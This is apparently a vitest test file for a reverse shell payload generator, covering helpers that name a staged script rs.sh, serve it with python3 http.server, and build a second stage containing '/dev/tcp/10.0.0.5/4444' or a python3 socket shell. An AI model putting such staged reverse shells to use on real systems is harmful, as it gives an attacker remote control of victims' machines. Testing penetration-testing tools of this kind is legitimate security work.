import { describe, expect, it } from "vitest";
import {
  createStageScript,
  stageFileName,
  stageServeCommand,
} from "./stage-file";
import type { ReverseShellConfig } from "./types";

const stagedConfig: ReverseShellConfig = {
  templateId: "bash-curl-staged",
  lhost: "10.0.0.5",
  lport: 4444,
  httpPort: 8080,
  shell: "/bin/bash",
  obfuscation: "none",
};

describe("stage helpers", () => {
  it("names shell scripts rs.sh by default", () => {
    expect(stageFileName(stagedConfig)).toBe("rs.sh");
  });

  it("generates python http.server command", () => {
    expect(stageServeCommand(stagedConfig)).toBe(
      "python3 -m http.server 8080 --bind 10.0.0.5",
    );
  });

  it("includes second-stage reverse shell instead of curl one-liner", () => {
    const script = createStageScript(stagedConfig);
    expect(script.startsWith("#!/bin/bash")).toBe(true);
    expect(script).toContain("/dev/tcp/10.0.0.5/4444");
    expect(script).not.toContain("curl -fsSL");
  });

  it("supports custom second-stage templates", () => {
    const script = createStageScript(stagedConfig, "python3-socket");
    expect(script).toContain("python3 -c");
    expect(script).toContain("10.0.0.5");
  });
});
